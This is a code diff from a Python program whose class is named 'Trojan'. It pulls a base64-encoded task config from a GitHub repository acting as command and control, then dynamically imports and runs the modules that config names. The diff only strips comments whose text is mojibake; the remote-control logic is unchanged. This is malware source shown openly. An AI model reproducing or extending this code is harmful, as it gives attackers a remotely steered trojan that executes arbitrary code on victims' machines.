@@ -20,7 +20,7 @@ def github_connect():
 
 
 def get_file_contents(dirname,module_name,repo):
-    #��Զ�ֿ̲�ץȡ�ļ�
+
     return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
@@ -31,17 +31,17 @@ class Trojan:
         self.repo=github_connect()
 
 
-    #�õ�һ��config�ļ��µ�json��ʵ������
+
     def get_config(self):
         config_json=get_file_contents(
             'config',self.config_file,self.repo
         )
 
-        #��jsonת��Ϊpython����
+
         config=json.loads(base64.b64decode(config_json))
 
         for task in config:
-            if task['module'] not in sys.modules:           #�����ģ��δ�����룬�����ģ��
+            if task['module'] not in sys.modules:           
                 exec("import %s"% task['module'])
         return config
     
